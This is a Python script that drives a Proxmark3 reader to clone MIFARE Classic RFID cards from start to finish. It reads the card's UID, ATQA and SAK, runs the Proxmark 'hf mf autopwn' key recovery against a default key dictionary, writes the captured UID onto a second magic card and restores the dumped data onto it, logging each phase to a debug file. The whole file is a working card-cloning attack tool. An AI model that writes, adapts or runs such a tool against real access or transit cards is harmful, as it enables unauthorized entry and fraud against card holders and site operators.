#!/usr/bin/env python3

import pm3
from output_grabber import OutputGrabber

class MifareClassicHandler:
    def __init__(self):
        self.device = pm3.pm3()
        self.uid = None
        self.atqa = None
        self.sak = None
        self.autopwned = False
        self.second_uid_set = False
        print(f"Device: {self.device.name}")

    def retrieve_card_info(self):
        out = OutputGrabber()
        with out:
            self.device.console("hf search")
        with open("debug.txt", "a") as f:
            f.write("RETRIEVE PHASE:\n")
            for line in out.capturedtext.split('\n'):
                line = line.replace("[32m", "").replace("[0m", "")
                if "UID: " in line:
                    uid = line.split('UID:')[1].strip().split()[0:4]
                    self.uid = ''.join(uid)
                    f.write(self.uid[0:8] + "\n")
                elif "ATQA: " in line:
                    atqa = line.split('ATQA:')[1].strip().split()[0:4]
                    self.atqa = ''.join(atqa)
                    f.write(self.atqa[0:4] + "\n")
                elif "SAK: " in line:
                    sak = line.split('SAK:')[1].strip().split()[0:4]
                    self.sak = ''.join(sak)[0:2]
                    f.write(self.sak + "\n")
        print(self.uid, self.atqa, self.sak)

    def autopwn(self):
        if (self.uid or self.atqa or self.sak) == None:
            print("No card identified")
            return
        out = OutputGrabber()
        print("Running autopwn...")
        with out:
            self.device.console("hf mf autopwn -f mfc_default_keys")
        with open("debug.txt", "a") as f:
            f.write("AUTOPWN PHASE:\n")
            for line in out.capturedtext.split('\n'):
                f.write(line + "\n")
                if "Saved" in line:
                    print(line)
                    self.autopwned = True

    def set_uid_on_second_card(self):
        if self.autopwned:
            input("Press enter once second card has been loaded")
            csetuid_command = f"hf mf csetuid -u {self.uid} -a {self.atqa} -s {self.sak}"
            out = OutputGrabber()
            print("Setting UID onto second card...")
            with out:
                self.device.console(csetuid_command)
            with open("debug.txt", "a") as f:
                f.write("CSETUID PHASE:\n")
                for line in out.capturedtext.split('\n'):
                    f.write(line + "\n")
                    if "New UID" in line:
                        self.second_uid_set = True

    def clone_card(self):
        if self.second_uid_set:
            out = OutputGrabber()
            print("Cloning card...")
            with out:
                self.device.console("hf mf restore")
            with open("debug.txt", "a") as f:
                f.write("CLONING PHASE:\n")
                for line in out.capturedtext.split('\n'):
                    f.write(line + "\n")
                f.write("---------------------------\n")

if __name__ == "__main__":
    handler = MifareClassicHandler()
    handler.retrieve_card_info()
    handler.autopwn()
    handler.set_uid_on_second_card()
    handler.clone_card()
